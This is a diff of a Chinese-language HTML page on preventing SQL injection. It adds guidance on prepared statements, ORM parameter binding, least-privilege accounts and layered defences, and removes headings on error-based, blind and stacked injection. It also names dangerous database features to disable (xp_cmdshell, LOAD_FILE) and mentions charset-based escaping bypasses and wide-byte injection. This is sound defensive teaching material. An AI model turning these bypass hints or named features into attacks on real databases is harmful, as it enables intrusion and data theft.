+<li>原理：预编译把「SQL 语句结构」和「数据」彻底分离</li>
+<li><strong>编译阶段</strong>：数据库先解析并编译 SQL 模板（如 SELECT * FROM users WHERE id = ?），此时语句结构已固定。</li>
+<li><strong>执行阶段</strong>：参数值通过独立通道传入，数据库只把它当数据，永远不参与语法解析。</li>
+<li>关键误区 ⚠️<ul>
+<li>表名、列名、ORDER BY 字段不能参数化。这些属于「标识符」，占位符只对「值」生效。必须用白名单映射（见第三条）。</li>
+<li>PHP 中 mysqli_real_escape_string ≠ 参数化，只是转义，仍有字符集绕过风险。</li>
+<li>PDO 模拟预处理（ATTR_EMULATE_PREPARES=true，默认）实际是客户端拼接，需设为 false 才真正预编译。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>ORM 安全封装<ul>
+<li>MyBatis 用 #{}，禁用 ${}。</li>
+<li>避免 whereRaw() / raw() 拼接。</li>
+<li>JPA/Hibernate 用命名参数。 </li>
+</ul>
+</li>
+<li>输入白名单 + 正则校验</li>
+<li>数据库最小权限</li>
+<li>Web 账号只给 SELECT/INSERT/UPDATE/DELETE，限定库表。</li>
+<li>禁止 FILE、PROCESS、SUPER、DROP、GRANT。</li>
+<li>运行时账号与迁移账号分离。</li>
+<li>错误信息脱敏</li>
+<li>多层防御<ul>
+<li>WAF：拦已知 payload，虚拟补丁。</li>
+<li>SAST：CI 阶段扫拼接代码。</li>
+<li>RASP / 数据库防火墙：运行时拦截异常 SQL。</li>
+<li>代码审计 + 渗透测试：定期验证。</li>
+</ul>
+</li>
+<li>其它<ul>
+<li>统一字符集为 UTF-8，防宽字节注入。</li>
+<li>关闭不必要的数据库功能（xp_cmdshell、LOAD_FILE）。</li>
+<li>敏感数据加密存储、脱敏展示。</li>
+<li>日志监控异常 SQL 与高频请求。</li>
+</ul>
+</li>
 </ol>
-<h4 id="_4">报错注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
-<ol>
-<li>利用触发条件错误来利用盲注SQL注入</li>
-<li>通过详细的SQL错误消息提取敏感数据</li>
-</ol>
-<h4 id="_5">时间盲注<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
-<ol>
-<li>利用SQL盲注触发时间延迟</li>
-</ol>
-<h3 id="_6">堆叠注入<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
-<h2 id="sql_5">如何防止SQL注入<a class="headerlink" href="#sql_5" title="Permanent link">&para;</a></h2>
-<h2 id="sqlcheat-sheet">SQL注入cheat sheet<a class="headerlink" href="#sqlcheat-sheet" title="Permanent link">&para;</a></h2>
 
 
 
